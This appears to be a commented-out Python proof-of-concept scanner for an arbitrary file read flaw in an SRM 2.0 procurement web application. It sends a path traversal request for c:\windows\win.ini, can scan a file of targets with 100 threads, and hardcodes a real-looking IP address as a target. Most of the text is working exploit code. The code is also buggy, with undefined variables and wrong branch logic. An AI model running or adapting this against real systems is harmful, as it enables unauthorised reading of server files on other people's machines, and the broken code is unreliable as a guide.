#
# import requests
# url = 'http://58.211.197.170:8083/#/login'
# payload = {'/adpweb/static/%2e%2e;/a/sys/runtimeLog/download?path=c:\\windows\win.ini'}
# headers = {
#     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
#     'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
#     'Accept-Encoding': 'gzip, deflate',
#     'Connection': 'keep-alive'
# }
# res1 = requests.get(url)
# #print(res1.status_code)
# if res1.status_code == 200:
#     res2 = url.replace('/#/login', '')
#     if '[fonts]' in res2:
#         print(f"[+]{url}存在任意文件读取")
#     else:
#         print(f"[-]{url}不存在任意文件读取")


# #写模板
# import argparse,requests
# from multiprocessing.dummy import Pool
# #banner信息
# def banner():
#     test = """
# ███████╗██████╗ ███╗   ███╗        ██████╗     ██████╗
# ██╔════╝██╔══██╗████╗ ████║        ╚════██╗   ██╔═████╗
# ███████╗██████╔╝██╔████╔██║         █████╔╝   ██║██╔██║
# ╚════██║██╔══██╗██║╚██╔╝██║        ██╔═══╝    ████╔╝██║
# ███████║██║  ██║██║ ╚═╝ ██║███████╗███████╗██╗╚██████╔╝
# ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝
#                                    author:SIS2405
#                                    date:2024-09-2
#                                    version:1.0
# """
#     print(test)
#
# def poc(target):
#     payload = '/adpweb/static/%2e%2e;/a/sys/runtimeLog/download?path=c:\\windows\win.ini'
#     headers = {
#         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
#         'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
#         'Accept-Encoding': 'gzip, deflate',
#         'Connection': 'keep-alive',
#     }
#     try:
#         res1 = requests.get(url=target)
#         if res1.status_code == 200:
#             res2 = requests.get(url=target+payload,headers=headers,verify=False,timeout=5)
#             if '[fonts]' in res2.text:
#                 print(f"该{target}存在任意文件读取")
#             else:
#                 print(f"该{target}不存在任意文件读取")
#         else:
#             print(f"该{target}可能存在问题，请手工检测")
#     except Exception as e:
#         print(e)
#
# def main():
#     # 命令行是不是需要接收参数 url（单挑的检测） file（批量）
#     # 实例化
#     banner()
#     url1_list = []
#     parse = argparse.ArgumentParser(description="智联云采_SRM_2.0_任意文件读取漏洞")
#     parse.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
#     parse.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
#     args = parse.parse_args()
#     if args.url and args.file:
#         poc(args.url)
#     elif args.file and not args.url:
#         with open(args.file,'r',encoding='utf-8') as f:
#             for url1 in f.readlines():
#                 url1 = url1.strip()
#                 url1_list = url_list.append(url)
#         mp = pool(100)
#         mp.map(poc,url_list)
#         mp.close()
#         mp.join()
#     else:
#         print(f"您的输入有误，请使用python file_name.py -h for help")
# if __name__ == '__main__':
#     main()


